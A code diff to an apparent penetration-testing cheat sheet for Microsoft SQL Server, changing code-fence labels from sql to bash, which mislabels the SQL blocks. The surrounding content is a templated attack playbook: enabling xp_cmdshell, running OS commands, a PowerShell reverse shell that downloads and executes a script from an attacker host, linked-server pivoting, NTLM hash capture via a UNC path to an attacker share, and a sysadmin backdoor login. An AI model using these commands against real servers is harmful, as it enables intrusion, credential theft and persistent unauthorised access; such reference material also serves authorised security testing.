@@ -62,7 +62,7 @@ impacket-mssqlclient -port {{PORT:port:1433}} {{DOMAIN:domain}}/{{USERNAME:str}}
 ## get version whoami
 Inspect server version and authenticated context.
 
-```sql
+```bash
 SELECT @@version;
 SELECT user_name();
 SELECT system_user;
@@ -75,7 +75,7 @@ SELECT system_user;
 ## list databases tables
 Enumerate databases and tables on the server.
 
-```sql
+```bash
 SELECT name FROM sys.databases;
 SELECT * FROM master.dbo.sysdatabases;
 SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
@@ -88,7 +88,7 @@ SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
 ## enum logins server principals
 List server-level principals including disabled accounts.
 
-```sql
+```bash
 SELECT name, type_desc, is_disabled FROM sys.server_principals;
 ```
 
@@ -99,7 +99,7 @@ SELECT name, type_desc, is_disabled FROM sys.server_principals;
 ## check current permissions
 List permissions granted to current user at server scope.
 
-```sql
+```bash
 SELECT permission_name FROM fn_my_permissions(NULL, 'SERVER');
 ```
 
@@ -110,7 +110,7 @@ SELECT permission_name FROM fn_my_permissions(NULL, 'SERVER');
 ## enable xp_cmdshell
 Reconfigure server to allow OS command execution.
 
-```sql
+```bash
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 ```
@@ -122,7 +122,7 @@ EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 ## exec os command xp_cmdshell
 Execute Windows command and return output.
 
-```sql
+```bash
 EXEC xp_cmdshell '{{COMMAND:str:whoami}}';
 ```
 
@@ -133,7 +133,7 @@ EXEC xp_cmdshell '{{COMMAND:str:whoami}}';
 ## reverse shell powershell xp_cmdshell
 Spawn PowerShell reverse shell from MSSQL.
 
-```sql
+```bash
 EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).downloadString(''http://{{LHOST:ip}}/rev.ps1'')"';
 ```
 
@@ -144,7 +144,7 @@ EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New
 ## enum linked servers
 List linked servers for lateral movement opportunities.
 
-```sql
+```bash
 EXEC sp_linkedservers;
 SELECT * FROM sys.servers;
 ```
@@ -156,7 +156,7 @@ SELECT * FROM sys.servers;
 ## pivot exec linked server
 Run xp_cmdshell on a linked server to pivot.
 
-```sql
+```bash
 EXEC ('EXEC xp_cmdshell ''whoami''') AT [{{LINKED_SERVER:str}}];
 ```
 
@@ -167,7 +167,7 @@ EXEC ('EXEC xp_cmdshell ''whoami''') AT [{{LINKED_SERVER:str}}];
 ## list directory xp_dirtree
 Enumerate filesystem directories (also useful for NTLM hash capture via UNC).
 
-```sql
+```bash
 EXEC master..xp_dirtree '{{PATH:str:C:\Users\}}';
 ```
 
@@ -178,7 +178,7 @@ EXEC master..xp_dirtree '{{PATH:str:C:\Users\}}';
 ## capture NTLM hash UNC coerce
 Force MSSQL to authenticate to attacker SMB server.
 
-```sql
+```bash
 EXEC master..xp_dirtree '\\{{LHOST:ip}}\share';
 ```
 
@@ -189,7 +189,7 @@ EXEC master..xp_dirtree '\\{{LHOST:ip}}\share';
 ## create sysadmin backdoor login
 Create a backdoor login with sysadmin role.
 
-```sql
+```bash
 CREATE LOGIN {{USERNAME:str:backdoor}} WITH PASSWORD = '{{PASSWORD:str:Pwn3d!}}';
 ALTER SERVER ROLE sysadmin ADD MEMBER {{USERNAME:str:backdoor}};
 ```
@@ -212,7 +212,7 @@ sqlcmd -S {{TARGET:ip}} -U {{USERNAME:str}} -P {{PASSWORD:str}} -Q "BACKUP DATAB
 ## read error log sensitive
 Inspect SQL Server error log (may contain credentials).
 
-```sql
+```bash
 EXEC xp_readerrorlog;
 ```
 
@@ -223,7 +223,7 @@ EXEC xp_readerrorlog;
 ## enable CLR integration rce
 Enable CLR for executing custom .NET assemblies on the server.
 
-```sql
+```bash
 EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
 ```
 
